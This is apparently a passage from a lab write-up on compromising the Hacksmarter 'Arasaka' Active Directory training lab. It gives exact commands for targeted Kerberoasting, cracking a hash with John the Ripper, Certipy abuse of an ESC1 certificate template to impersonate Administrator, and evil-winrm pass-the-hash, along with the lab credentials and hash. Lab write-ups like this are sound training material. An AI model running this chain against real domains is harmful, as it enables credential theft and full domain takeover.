# :game_die: Hacksmarter Arasaka Ad Lab Writeup B57D7E0B5E48

---

- In order to verify whether if ADCS existed, I ran the following command on the domain controller to list active CA (Certification Authority) servers in the domain.

*Running certutil to list active CA Servers in the domain*

```
certutil -config - -ping
```

- And as expected, a Certificate Authority server was present in the environment — in fact, the Domain Controller itself. The CA (Certification Authority) name was hacksmarter-DC01-CA.

## -0x04: Abusing GenericWrite rights to gain access to perform a targeted Kerberoasting attack -

- Next, I carried out a targeted Kerberoast attack against the soulkiller.svc account using targetedKerberoast.py and successfully obtained its TGS hash.

*Using targettedKerberoast.py to retrieve the TGS hash of soulkiller.svc account*

```
python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'Yorin@123'
```

- Once again, I used JohnTheRipper to crack the TGS hash, and within a minute, I had the clear-text password on my screen. Which turned out to be MYpassword123#.

*Using JohnTheRipper to crack the TGS hash of soulkiller.svc account*

```
john --wordlist=/usr/share/wordlists/rockyou.txt soulkiller.svc.hash
```

*Using NXC to verify the credentials of soulkiller.svc account*

```
nxc smb 10.1.167.43 -u soulkiller.svc -p 'MYpassword123#'
```

## -0x05: Abusing ADCS ESC1 to escalate to Domain Admin -

- Since the soulkiller.svc account was involved in certificate management, I ran Certipy to look for any certificate template vulnerabilities that could potentially be exploited to escalate privileges to Domain Administrator.

*Running certipy to identify any vulnerable ADCS certificate templates*

```
certipy find -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -vulnerable -stdout -dc-ip 10.1.167.43 -enabled
```

- Reviewing the output, I found a certificate template named AI_Takeover that was vulnerable to ADCS ESC1. The soulkiller.svc account had permission to enroll in this template and was also allowed to specify a Subject Alternative Name when requesting a certificate. The template’s EKU included *Client Authentication*, which meant we could leverage it to authenticate to the Domain Controller and obtain the NTLM hash of a Domain Administrator account.

- I then used Certipy again to request a certificate from the AI_Takeover template, specifying the Administrator account as the Subject Alternative Name (SAN) and using hacksmarter-DC01-CA as the CA name.

*Using certipy in order to request a certificate for the Administrator account (ESC1 Abuse)*

```
certipy req -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -template "AI_Takeover" -upn "Administrator@hacksmarter.local" -ca "hacksmarter-DC01-CA" -dc-ip 10.1.167.43
```

- Next, I used certipy again, but this time with the auth module, to authenticate to the domain controller and retrieve the NTLM hash of the Administrator account.

*Using certipy to retrieve the NTLM hash of the Administrator account*

```
certipy auth -pfx administrator.pfx -dc-ip 10.1.167.43
```

- With the Administrator’s NTLM hash in hand, I used Evil-WinRM to gain access to the Domain Controller as the Administrator, resulting in a complete domain compromise.

*Using evil-winrm to establish a WinRM session to the DC leading to a full domain compromise*

```
evil-winrm -i hacksmarter.local -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec
```

And with that, the lab was fully compromised — from the initial foothold to the lateral movement chain and finally achieving full domain compromise. Hope you enjoyed the walkthrough! Make sure to subscribe to Avyukt Security to stay updated with the latest cybersecurity content.

## Get Avyukt Security’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Happy Hacking!

---
